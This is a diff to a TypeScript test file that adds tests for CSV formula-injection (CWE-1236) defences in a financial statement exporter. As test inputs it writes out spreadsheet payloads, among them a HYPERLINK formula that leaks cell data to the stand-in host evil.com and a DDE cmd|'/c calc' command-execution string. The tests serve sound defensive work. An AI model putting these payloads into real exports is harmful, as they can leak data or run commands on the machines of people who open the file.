@@ -3,6 +3,7 @@ import { STATEMENT_COLUMNS } from '@ancore/types';
 
 import {
   fetchStatementRows,
+  neutralizeCsvFormula,
   sanitizeMemo,
   toStatementCsv,
   StatementExportService,
@@ -88,6 +89,51 @@ describe('toStatementCsv', () => {
   it('doubles inner quotes for proper RFC 4180 escaping', () => {
     const csv = toStatementCsv([{ ...row, memoOrReference: 'Say "hello"' }]);
     expect(csv).toContain('Say ""hello""');
+  });
+});
+
+describe('CSV formula injection (CWE-1236)', () => {
+  it('neutralises a HYPERLINK payload smuggled through a memo', () => {
+    const csv = toStatementCsv([{ ...row, memoOrReference: '=HYPERLINK("http://evil.com?"&A1)' }]);
+
+    // Quoted because of the comma-free but quote-bearing payload; the key
+    // assertion is that the cell no longer starts with `=`.
+    expect(csv).toContain('\'=HYPERLINK(""http://evil.com?""&A1)');
+    expect(csv).not.toContain(',=HYPERLINK');
+  });
+
+  it.each(['=', '+', '-', '@'])('neutralises a leading %s in a memo', (prefix) => {
+    const csv = toStatementCsv([{ ...row, memoOrReference: `${prefix}cmd|'/c calc'!A0` }]);
+    expect(csv.split('\n')[1].endsWith(`'${prefix}cmd|'/c calc'!A0`)).toBe(true);
+  });
+
+  it('neutralises a formula in the attacker-influenceable counterparty column', () => {
+    const csv = toStatementCsv([{ ...row, counterparty: '@SUM(1+1)*cmd' }]);
+    expect(csv.split('\n')[1]).toContain(",'@SUM(1+1)*cmd,");
+  });
+
+  it('neutralises leading whitespace-prefixed formulas Excel would still evaluate', () => {
+    expect(neutralizeCsvFormula('\t=1+1')).toBe("'\t=1+1");
+    expect(neutralizeCsvFormula('\r=1+1')).toBe("'\r=1+1");
+  });
+
+  it('leaves negative amounts untouched so they stay numeric', () => {
+    const csv = toStatementCsv([{ ...row, amount: '-142.50' }]);
+    expect(csv.split('\n')[1]).toContain(',-142.50,');
+    expect(csv).not.toContain("'-142.50");
+  });
+
+  it('leaves ordinary text and headers untouched', () => {
+    expect(neutralizeCsvFormula('Invoice 1042')).toBe('Invoice 1042');
+    expect(neutralizeCsvFormula('')).toBe('');
+    expect(toStatementCsv([]).split('\n')[0]).toBe(
+      'Timestamp,Counterparty,Amount,Asset,Status,Memo/Reference'
+    );
+  });
+
+  it('quotes as well as neutralises when the payload also contains a comma', () => {
+    const csv = toStatementCsv([{ ...row, memoOrReference: '=1,2' }]);
+    expect(csv).toContain('"\'=1,2"');
   });
 });
 
